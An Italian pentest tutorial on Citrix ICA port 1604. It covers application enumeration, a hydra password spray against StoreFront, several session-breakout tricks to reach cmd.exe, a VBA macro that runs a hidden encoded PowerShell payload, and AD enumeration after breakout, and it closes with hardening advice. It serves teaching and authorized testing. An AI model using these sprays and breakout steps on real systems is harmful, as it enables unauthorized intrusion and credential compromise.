---
title: 'Porta 1604 Citrix ICA: ICA Browser, App Pubblicate e StoreFront'
slug: porta-1604-citrix-ica
description: >-
  Pentest Citrix sulla porta 1604/UDP: enumerazione ICA Browser, app pubblicate,
  StoreFront, servizi 1494/2598 e accesso agli ambienti Citrix Virtual Apps in
  lab.
image: /porta-1604-citrix-ica.webp
draft: false
date: 2026-04-12T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - Citrix ICA
  - Citrix Virtual Apps
  - Citrix Virtual Apps
---

La porta 1604/UDP è il canale di browser service di Citrix (ICA Browser / XML Service discovery), usato per enumerare le applicazioni pubblicate in ambienti Citrix Virtual Apps & Desktops (ex XenApp). Citrix è una delle soluzioni di desktop virtuale **più diffuse in enterprise**: compromettere Citrix significa accesso alle applicazioni interne, spesso con credenziali AD. Il "Citrix breakout" — uscire dalla sessione pubblicata per ottenere una shell completa — è una delle tecniche più cercate nel pentest.

**COS'È PORT 1604**

* La porta 1604/UDP permette l'enumerazione delle applicazioni pubblicate Citrix senza autenticazione
* Le credenziali Citrix sono quasi sempre AD — compromettere Citrix = compromettere l'identità AD dell'utente
* Il breakout dalla sessione Citrix (da app pubblicata a desktop completo o shell) è il vettore principale di escalation

Porta 1604 Citrix ICA è il canale UDP del Citrix ICA Browser Service, il protocollo di discovery per ambienti Citrix Virtual Apps. La porta 1604 vulnerabilità principali sono l'enumerazione delle applicazioni senza autenticazione, le credenziali AD deboli e la possibilità di breakout dalla sessione Citrix. L'enumerazione porta 1604 rivela le applicazioni pubblicate (browser, client email, ERP, terminali) disponibili nell'ambiente Citrix. Nel Citrix pentest, l'obiettivo è passare da una sessione limitata (app pubblicata) a una shell completa sul server Citrix o sulla rete interna.

## 1. Anatomia Tecnica della Porta 1604

| Porta        | Servizio                  | Ruolo                                 |
| ------------ | ------------------------- | ------------------------------------- |
| **1604/UDP** | **ICA Browser**           | **Discovery applicazioni pubblicate** |
| 1494/TCP     | ICA                       | Sessione desktop/app (traffico)       |
| 2598/TCP     | CGP (Session Reliability) | Sessione con affidabilità             |
| 80/443       | StoreFront/Web Interface  | Portale web per login                 |
| 8080         | XML Service               | API XML per enumerazione              |

Il flusso Citrix:

1. Client enumera applicazioni via porta 1604/UDP o XML Service (80/443/8080)
2. Client presenta le credenziali (AD username/password)
3. Server assegna una sessione ICA sulla porta 1494 o 2598
4. L'applicazione pubblicata si apre nel client Citrix Receiver/Workspace

```
Misconfig: ICA Browser esposto senza autenticazione
Impatto: lista di tutte le applicazioni pubblicate visibile a chiunque sulla rete
Come si verifica: nmap -sU -p 1604 [target] — se open, enumera con tool specifici
```

```
Misconfig: Applicazione pubblicata che dà accesso al desktop completo
Impatto: da app limitata a desktop → da desktop a cmd → rete interna
Come si verifica: connettiti a un'app pubblicata e cerca di aprire Explorer/CMD
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sU -sV -p 1604 10.10.10.90
nmap -sV -p 1494,2598,443,8080 10.10.10.90
```

**Output atteso:**

```
PORT     STATE         SERVICE
1604/udp open|filtered citrix-ica
1494/tcp open          citrix-ica
2598/tcp open          citrix-cgp
443/tcp  open          ssl/https  Citrix StoreFront
```

**Cosa ci dice questo output:** ambiente Citrix completo — browser sulla 1604, sessioni sulla 1494/2598, portale StoreFront sulla 443.

### Comando 2: Enumerazione applicazioni pubblicate

```bash
# Con nmap script
nmap -sU -p 1604 --script citrix-enum-apps 10.10.10.90
```

**Output:**

```
| citrix-enum-apps:
|   Microsoft Word
|   Microsoft Excel
|   SAP GUI
|   Internet Explorer
|   PeopleSoft
|_  Desktop Completo
```

**Lettura dell'output:** sei applicazioni pubblicate. `Desktop Completo` è il target — se accessibile, hai un desktop Windows completo sul server Citrix. `SAP GUI` e `PeopleSoft` sono applicazioni ERP con dati business-critical.

### Enumerazione via XML Service

```bash
curl -sk "https://10.10.10.90/Citrix/PNAgent/enum.aspx" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="utf-8"?><NFuseProtocol version="4.1"><RequestAppData><Scope traverse="subtree"></Scope><DesiredDetails>permissions</DesiredDetails></RequestAppData></NFuseProtocol>'
```

## 3. Tecniche Offensive

**Credential spray su StoreFront**

Contesto: il portale StoreFront (443) è raggiungibile. Le credenziali sono AD.

```bash
# Spray su StoreFront web interface
hydra -L ad_users.txt -p 'Spring2026!' https-post-form \
  "https://10.10.10.90/Citrix/Authentication/ExplicitForms/Login:username=^USER^&password=^PASS^:incorrect"
```

**Cosa fai dopo:** credenziali valide → login al portale → lancio applicazione pubblicata → sessione ICA. Per il [password spray AD](https://hackita.it/articoli/bruteforce), le stesse credenziali funzionano su SMB, OWA, VPN.

**Citrix breakout — da app pubblicata a shell**

Contesto: sei dentro una sessione Citrix con un'app limitata (es: Word, Excel, browser). Vuoi ottenere una shell completa.

**Tecnica 1: Dialog box abuse**

```
1. Nell'app pubblicata: File → Open (o Save As)
2. Nella barra di navigazione del dialog: digita \\127.0.0.1\c$
   o digita C:\Windows\System32\cmd.exe
3. Clic destro su cmd.exe → Open
4. Shell CMD sul server Citrix
```

**Tecnica 2: Help menu**

```
1. Nell'app: Help → About (o F1)
2. Se si apre un browser di help: cerca un link cliccabile
3. Click destro → Open in new window → barra indirizzi → C:\Windows\System32\cmd.exe
```

**Tecnica 3: Print dialog**

```
1. Nell'app: File → Print
2. Seleziona "Print to File" o "Microsoft Print to PDF"
3. Nel dialog di salvataggio: naviga a C:\Windows\System32\
4. Apri cmd.exe o powershell.exe
```

**Tecnica 4: Sticky Keys / Utilman bypass**

```
1. Nella sessione Citrix: premi Shift 5 volte (Sticky Keys)
2. Se non bloccato: si apre il dialog di accessibilità
3. Da lì: cerca di aprire Control Panel → link → shell
```

**Cosa fai dopo:** shell CMD/PowerShell sul server Citrix. Da qui: `whoami /groups` per verificare privilegi, `net user /domain` per enumerare AD, pivot verso la [rete interna](https://hackita.it/articoli/active-directory).

**Post-breakout enumeration**

```cmd
:: Dopo breakout — verifica ambiente
whoami /all
hostname
ipconfig /all
net user /domain
net group "Domain Admins" /domain
```

## 4. Scenari Pratici

### Scenario 1: Citrix esterno con StoreFront

**Step 1:**

```bash
nmap -sV -p 443,1494,2598,8080 [target]
```

**Step 2:**

```bash
# Spray credenziali AD sul portale StoreFront
```

**Step 3:**

```
Login → lancia applicazione → tentativo breakout
```

**Se fallisce:**

* Causa: Group Policy restrittive (no CMD, no dialog box navigation)
* Fix: prova UNC path `\\tsclient\c` (drive mapping dal client), oppure macro Word/Excel per eseguire comandi

**Tempo stimato:** 15-60 minuti

### Scenario 2: Breakout con macro Office

**Situazione:** Word/Excel pubblicato. Dialog box bloccati.

```vba
' Macro VBA in Word
Sub Breakout()
    Shell "cmd.exe /c powershell -e [base64_payload]", vbHide
End Sub
```

**Se fallisce:**

* Causa: macro disabilitate via GPO
* Fix: prova PowerShell via WMI: `CreateObject("WScript.Shell").Run "cmd"`

## 5. Cheat Sheet Finale

| Azione               | Comando                                               |
| -------------------- | ----------------------------------------------------- |
| Scan                 | `nmap -sU -p 1604; nmap -p 1494,2598,443 [target]`    |
| App enum             | `nmap -sU -p 1604 --script citrix-enum-apps [target]` |
| StoreFront spray     | `hydra -L users -p pass https-post-form [target]`     |
| Breakout File dialog | `File → Open → C:\Windows\System32\cmd.exe`           |
| Breakout Help        | `F1 → link → browser → shell`                         |
| Breakout Print       | `Print to File → navigate → cmd.exe`                  |
| Post-breakout        | `whoami /all && net user /domain`                     |

### Perché Porta 1604 è rilevante nel 2026

Citrix è usato da migliaia di enterprise per remote access. Un portale Citrix esposto su Internet è un punto di ingresso diretto alla rete interna — basta un utente con password debole. Il breakout da sessione limitata è una skill fondamentale nel pentest. Le CVE Citrix (CVE-2023-3519 RCE su NetScaler, CVE-2023-4966 "Citrix Bleed") hanno dimostrato l'impatto devastante di un Citrix compromesso.

### Hardening

* Disabilita ICA Browser (1604) se non necessario — usa StoreFront
* GPO restrittive: blocca CMD, PowerShell, dialog box navigation, macro
* 2FA/MFA su StoreFront
* Segmenta il server Citrix dalla rete interna
* Monitora breakout attempt (process creation da app Citrix)

***

Riferimento: Citrix documentation, CVE-2023-3519, CVE-2023-4966. Uso esclusivo in ambienti autorizzati.

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
